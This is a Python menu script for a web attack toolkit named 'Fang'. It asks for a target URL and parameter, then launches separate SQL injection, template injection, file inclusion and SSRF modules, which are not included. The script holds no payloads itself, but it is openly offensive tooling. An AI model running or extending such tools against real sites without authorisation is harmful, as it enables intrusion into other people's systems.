#!/usr/bin/env python3
import subprocess
import shlex
import os
import sys
import pyfiglet

def sql_injection():
    os.chdir("SQLI")
    print("[+] Enter the URL of the vulnerable web application: ")
    url = input(">>> ")
    print("[+] Enter the vulnerable parameter: ")
    param = input(">>> ")
    print("[+] Enter encoding method (none, url, double, base64) [default: none]: ")
    encode = input(">>> ").strip() or "none"

    cmd = f"python3 sqli.py -u {url} -p {param} -e {encode}"
    subprocess.run(shlex.split(cmd))
    os.chdir("..")

def ssti():
    os.chdir("SSTI")
    print("[+] Do you want to log into the web application? (y/n)")
    choice = input(">>> ").strip().lower()

    print("[+] Enter the URL of the vulnerable web application: ")
    url = input(">>> ")
    print("[+] Enter the vulnerable parameter: ")
    param = input(">>> ")

    if choice == "y":
        print("[+] Enter the username: ")
        username = input(">>> ")
        print("[+] Enter the password: ")
        password = input(">>> ")
        cmd = f"python3 ssti.py {url} {param} --login --username {username} --password {password}"
    elif choice == "n":
        cmd = f"python3 ssti.py {url} {param}"
    else:
        print("[-] Invalid choice, defaulting to no login")
        cmd = f"python3 ssti.py {url} {param}"

    subprocess.run(shlex.split(cmd))
    os.chdir("..")

def lfi():
    os.chdir("LFI")
    print("[+] Enter the URL of the vulnerable web application: ")
    url = input(">>> ")
    print("[+] Enter the vulnerable parameter: ")
    param = input(">>> ")
    print("[+] Enter the LFI payload: ")
    lfi_payload = input(">>> ")
    print("[+] Enter the HTTP method (GET or POST) [default: GET]: ")
    method = input(">>> ").strip().upper() or "GET"
    print("[+] Enter encoding method (none, url, double, base64) [default: none]: ")
    encode = input(">>> ").strip() or "none"

    cmd = f"python3 lfi.py {url} {param} {lfi_payload} --method {method} --encode {encode}"
    subprocess.run(shlex.split(cmd))
    os.chdir("..")

def ssrf():
    os.chdir("SSRF")
    print("[+] Enter the URL of the vulnerable web application: ")
    url = input(">>> ")
    print("[+] Enter the vulnerable parameter: ")
    param = input(">>> ")
    print("[+] Enter the public IP address: ")
    public_ip = input(">>> ")
    print("[+] Enter the port number: ")
    port_number = input(">>> ")

    cmd = f"python3 ssrf.py {url} {param} {public_ip} {port_number}"
    subprocess.run(shlex.split(cmd))
    os.chdir("..")

def main():
    ascii_banner = pyfiglet.figlet_format("Fang")
    print(ascii_banner)
    while True:
        print("1. SQL Injection")
        print("2. Server-Side Template Injection")
        print("3. Local File Inclusion")
        print("4. Server-Side Request Forgery")
        print("5. Exit")
        print(">>> ", end="")
        choice = input().strip()
        if choice == "1":
            sql_injection()
        elif choice == "2":
            ssti()
        elif choice == "3":
            lfi()
        elif choice == "4":
            ssrf()
        elif choice == "5":
            print("[*] Exiting...")
            sys.exit(0)
        else:
            print("[-] Invalid choice")

if __name__ == "__main__":
    main()
